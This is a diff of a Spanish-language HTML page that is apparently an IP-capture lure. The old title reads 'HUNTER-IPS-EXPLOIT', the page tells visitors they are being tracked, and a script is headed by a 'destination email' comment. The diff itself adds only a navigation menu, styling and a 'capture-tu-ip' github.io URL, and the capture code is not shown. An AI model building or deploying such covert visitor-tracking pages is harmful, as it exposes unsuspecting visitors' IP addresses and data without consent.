@@ -3,16 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HUNTER-IPS-EXPLOIT:V1.0 - BY 77, 32 Y 33.</title>
+    <title>Página de Prueba - Estable y Máxima Captura</title>
+    
+    <link rel="icon" type="image/png" href="favicon.png"> 
+
     <style>
-        /* --- ESTILOS RAVE/DARK --- */
+        /* --- ESTILOS RAVE/DARK BÁSICOS --- */
         body {
             font-family: 'Arial Black', sans-serif;
             text-align: center;
-            padding-top: 50px;
+            padding: 0; /* Lo cambié para que el menú toque los bordes */
+            margin: 0;
             background-color: #121212;
             color: #E0E0E0;
         }
+
+        /* --- ESTILOS DEL MENÚ DE NAVEGACIÓN --- */
+        nav {
+            background-color: #1A1A1A;
+            padding: 15px 0;
+            border-bottom: 2px solid #00ff99;
+            box-shadow: 0 5px 15px rgba(0, 255, 153, 0.2);
+            width: 100%;
+        }
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav ul li {
+            margin: 0 20px;
+        }
+        nav ul li a {
+            text-decoration: none;
+            color: #00ff99;
+            font-size: 1.1em;
+            text-shadow: 0 0 8px rgba(0, 255, 153, 0.7);
+            transition: color 0.3s, text-shadow 0.3s;
+        }
+        nav ul li a:hover {
+            color: #ffffff;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 1);
+        }
+        
+        .content {
+             padding-top: 50px; /* Separación para que el menú no tape el H1 */
+        }
+        /* --- FIN ESTILOS MENÚ --- */
+
+        /* --- ESTILOS RAVE/DARK ORIGINALES --- */
         h1 {
             color: #00ff99;
             text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
@@ -33,15 +74,27 @@
     </style>
 </head>
 <body>
-    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
-    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
+    
+    <nav>
+        <ul>
+            <li><a href="#">INICIO</a></li>
+            <li><a href="#">GALERÍA</a></li>
+            <li><a href="#">CONTACTO</a></li>
+            <li><a href="#">OTRA COSA</a></li>
+        </ul>
+    </nav>
+    
+    <div class="content">
+        <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
+        <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
 
-    <video width="720" controls>
-      <source src="clip.mp4" type="video/mp4">
-      Tu navegador no puede reproducir este video.
-    </video>
+        <video width="720" controls>
+          <source src="clip.mp4" type="video/mp4">
+          Tu navegador no puede reproducir este video.
+        </video>
 
-    <p>CAZADO</p>
+        <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
+    </div>
 
     <script>
         // 📧 CORREO DE DESTINO:
@@ -159,4 +212,3 @@
     </script>
 </body>
 </html>
-
